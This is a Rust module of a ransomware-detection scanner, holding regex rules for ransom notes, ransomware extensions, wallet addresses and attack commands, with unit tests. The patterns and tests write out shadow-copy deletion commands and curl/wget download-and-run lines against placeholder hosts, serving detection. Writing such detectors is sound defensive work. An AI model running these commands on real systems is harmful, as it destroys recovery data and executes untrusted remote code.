use once_cell::sync::Lazy;
use regex::Regex;
use serde::Deserialize;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Scope {
    /// match against the file name only
    Filename,
    /// match against the full path
    Path,
    /// match against file content (lossy utf-8 view)
    Content,
}

#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub enum Severity {
    Info,
    Medium,
    High,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MEDIUM",
            Severity::Info => "INFO",
        }
    }
    pub fn code(self) -> &'static str {
        match self {
            Severity::High => crate::output::HIGH,
            Severity::Medium => crate::output::MEDIUM,
            Severity::Info => crate::output::INFO,
        }
    }
    pub fn parse(s: &str) -> Option<Severity> {
        match s.to_ascii_lowercase().as_str() {
            "high" => Some(Severity::High),
            "medium" => Some(Severity::Medium),
            "info" => Some(Severity::Info),
            _ => None,
        }
    }
}

#[derive(Debug, Clone)]
pub struct Rule {
    pub id: String,
    pub desc: String,
    pub severity: Severity,
    pub scope: Scope,
    pub re: Regex,
}

#[derive(Debug, PartialEq, serde::Serialize)]
pub struct Finding {
    pub rule: String,
    pub severity: String,
    pub path: String,
    pub offset: usize,
    pub line: Option<usize>,
    pub snippet: String,
}

fn builtin(id: &str, desc: &str, sev: Severity, scope: Scope, pat: &str) -> Rule {
    Rule {
        id: id.to_string(),
        desc: desc.to_string(),
        severity: sev,
        scope,
        re: Regex::new(pat).expect("builtin regex must compile"),
    }
}

/// the stock ransomware-oriented rule pack.
/// filename rules run case-insensitive against the file name,
/// path rules against the whole path, content rules against a
/// lossy utf-8 view of the first --max-size bytes.
pub static PACK: Lazy<Vec<Rule>> = Lazy::new(|| {
    vec![
        // ---- filename / path ----
        builtin(
            "RANSOM-NOTE",
            "ransom note file name",
            Severity::High,
            Scope::Filename,
            r"(?i)^(readme|decrypt|restore|recovery|how_to|howto|read_this|warning|important|attention)[_. -].*\.(txt|html|htm|hta|url|lnk)$",
        ),
        builtin(
            "RANSOM-NOTE2",
            "underscore-prefixed note name (windows families)",
            Severity::High,
            Scope::Filename,
            r"(?i)^_(help|readme|recover|decrypt|restore|info)[a-z0-9_. -]*\.(txt|html|htm|hta)$",
        ),
        builtin(
            "RANSOM-EXT",
            "known ransomware extension",
            Severity::High,
            Scope::Filename,
            r"(?i)\.(lockbit|locky|wcry|cerber|phobos|dharma|conti|revil|maze|ekans|medusalocker|mallox|blackcat|alphv|akira|rhysida|crypt)$",
        ),
        builtin(
            "RANSOM-DOUBLE-EXT",
            "double extension appended by encryption",
            Severity::High,
            Scope::Filename,
            r"(?i)\.[a-z0-9]{4,16}\.(locked|encrypted|encrypt|crypt|enc|locked1|8lock8)$",
        ),
        builtin(
            "SUSP-SYSTEM-EXE-IN-TMP",
            "system binary name dropped in a temp directory",
            Severity::High,
            Scope::Path,
            r"(?i)/(tmp|var/tmp|dev/shm)/[^/]*\.(svchost|lsass|csrss|smss|services|taskhost)\.exe$",
        ),
        // ---- content ----
        builtin(
            "RANSOM-TEXT",
            "ransom note boilerplate in content",
            Severity::High,
            Scope::Content,
            r"(?i)(your files (have been|are) (encrypted|locked)|all your (files|data) (have been|are) encrypted|decryption (requires|needs|costs) .{0,20}payment|recovery_key\.txt|payment within \d+ (hours|days))",
        ),
        builtin(
            "VSS-WIPE",
            "shadow copy / recovery destruction command",
            Severity::High,
            Scope::Content,
            r"(?i)(vssadmin delete shadows|wbadmin delete catalog|bcdedit .{0,30}recoveryenabled no|wmic shadowcopy delete)",
        ),
        builtin(
            "SH-CURLPIPE",
            "curl/wget piped straight into a shell",
            Severity::High,
            Scope::Content,
            r"(?i)(curl|wget)[^\n|;]{4,200}\|\s*(sudo\s+)?(ba|z|k|fi)?sh\b",
        ),
        builtin(
            "PS-ENCODED",
            "encoded powershell payload",
            Severity::Medium,
            Scope::Content,
            r"(?i)-enc(odedcommand)?\s+[A-Za-z0-9+/=]{100,}",
        ),
        builtin(
            "TOR-LINK",
            "tor onion service reference",
            Severity::Medium,
            Scope::Content,
            r"\b[a-z2-7]{16,56}\.onion\b",
        ),
        builtin(
            "BTC-ADDR",
            "bitcoin address",
            Severity::Info,
            Scope::Content,
            r"\b(bc1[a-z0-9]{20,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b",
        ),
        builtin(
            "XMR-ADDR",
            "monero address",
            Severity::Info,
            Scope::Content,
            r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b",
        ),
        builtin(
            "ETH-ADDR",
            "ethereum address",
            Severity::Info,
            Scope::Content,
            r"\b0x[a-fA-F0-9]{40}\b",
        ),
        builtin(
            "IPV4-REF",
            "hard-coded ipv4 address",
            Severity::Info,
            Scope::Content,
            r"\b(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(?:\.(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b",
        ),
    ]
});

#[derive(Deserialize)]
pub struct CustomRule {
    pub id: String,
    pub severity: String,
    pub scope: String,
    pub regex: String,
    #[serde(default)]
    pub desc: String,
}

/// load user rules from a json file: [{"id","severity","scope","regex"}]
pub fn load_custom(path: &str) -> Result<Vec<Rule>, anyhow::Error> {
    let raw = std::fs::read_to_string(path)?;
    let defs: Vec<CustomRule> =
        serde_json::from_str(&raw).map_err(|e| anyhow::anyhow!("bad rules file {path}: {e}"))?;
    let mut out = Vec::new();
    for d in defs {
        let severity = Severity::parse(&d.severity)
            .ok_or_else(|| anyhow::anyhow!("rule {}: bad severity '{}'", d.id, d.severity))?;
        let scope = match d.scope.to_ascii_lowercase().as_str() {
            "filename" => Scope::Filename,
            "path" => Scope::Path,
            "content" => Scope::Content,
            other => return Err(anyhow::anyhow!("rule {}: bad scope '{other}'", d.id)),
        };
        let re =
            Regex::new(&d.regex).map_err(|e| anyhow::anyhow!("rule {}: bad regex: {e}", d.id))?;
        out.push(Rule {
            id: d.id,
            desc: if d.desc.is_empty() {
                "custom rule".into()
            } else {
                d.desc
            },
            severity,
            scope,
            re,
        });
    }
    Ok(out)
}

pub fn snippet(text: &str, start: usize, end: usize) -> String {
    let raw = &text[start..end.min(text.len())];
    let cleaned: String = raw
        .chars()
        .map(|c| {
            if c == '\n' || c == '\r' || c == '\t' {
                ' '
            } else {
                c
            }
        })
        .collect();
    let trimmed = cleaned.trim();
    if trimmed.chars().count() > 90 {
        let cut: String = trimmed.chars().take(87).collect();
        format!("{cut}...")
    } else {
        trimmed.to_string()
    }
}

pub fn line_of(text: &str, start: usize) -> usize {
    text[..start].bytes().filter(|b| *b == b'\n').count() + 1
}

#[cfg(test)]
mod tests {
    use super::*;

    fn find(id: &str) -> &'static Rule {
        PACK.iter().find(|r| r.id == id).unwrap()
    }

    #[test]
    fn ransom_note_filenames() {
        let r = find("RANSOM-NOTE");
        for name in [
            "RESTORE_FILES.txt",
            "readme_decrypt.html",
            "How_To_Decrypt.txt",
        ] {
            assert!(r.re.is_match(name), "{name} should match RANSOM-NOTE");
        }
        assert!(!r.re.is_match("meeting_notes.txt"));
    }

    #[test]
    fn double_extension() {
        let r = find("RANSOM-DOUBLE-EXT");
        assert!(r.re.is_match("invoice.pdf.8x2q.locked"));
        assert!(r.re.is_match("photo.jpg.A5f1.encrypted"));
        assert!(!r.re.is_match("archive.tar.gz"));
    }

    #[test]
    fn known_ransomware_extensions() {
        let r = find("RANSOM-EXT");
        assert!(r.re.is_match("budget.xlsx.phobos"));
        assert!(r.re.is_match("data.mallox"));
        assert!(!r.re.is_match("song.mp3"));
    }

    #[test]
    fn ransom_text_content() {
        let r = find("RANSOM-TEXT");
        assert!(r.re.is_match("ALL YOUR FILES HAVE BEEN ENCRYPTED"));
        assert!(r.re.is_match("Payment within 72 hours"));
        assert!(!r.re.is_match("your files are backed up daily"));
    }

    #[test]
    fn curl_pipe_shell() {
        let r = find("SH-CURLPIPE");
        assert!(r.re.is_match("curl http://x.test/s.sh | sh"));
        assert!(r.re.is_match("wget -qO- https://x.test/i | bash"));
        assert!(!r.re.is_match("curl http://x.test/data.json -o out"));
    }

    #[test]
    fn wallet_addresses() {
        assert!(find("BTC-ADDR")
            .re
            .is_match("send to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh now"));
        assert!(find("XMR-ADDR").re.is_match(
            "4Ajsd8sdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78asdf78"
        ));
        assert!(find("ETH-ADDR")
            .re
            .is_match("0x71C7656EC7ab88b098defB751B7401B5f6d8976F"));
    }

    #[test]
    fn vss_wipe() {
        assert!(find("VSS-WIPE")
            .re
            .is_match("vssadmin delete shadows /all /quiet"));
        assert!(find("VSS-WIPE")
            .re
            .is_match("wbadmin delete catalog -quiet"));
    }

    #[test]
    fn snippet_and_line() {
        let text = "line one\nline two\nALL YOUR FILES HAVE BEEN ENCRYPTED\n";
        let m = find("RANSOM-TEXT").re.find(text).unwrap();
        assert_eq!(line_of(text, m.start()), 3);
        assert_eq!(
            snippet(text, m.start(), m.end()),
            "ALL YOUR FILES HAVE BEEN ENCRYPTED"
        );
    }

    #[test]
    fn custom_rules_parse() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("rules.json");
        std::fs::write(
            &p,
            r#"[{"id":"CORP-TAG","severity":"medium","scope":"content","regex":"internal-project-x"}]"#,
        )
        .unwrap();
        let rules = load_custom(p.to_str().unwrap()).unwrap();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].severity, Severity::Medium);
    }
}
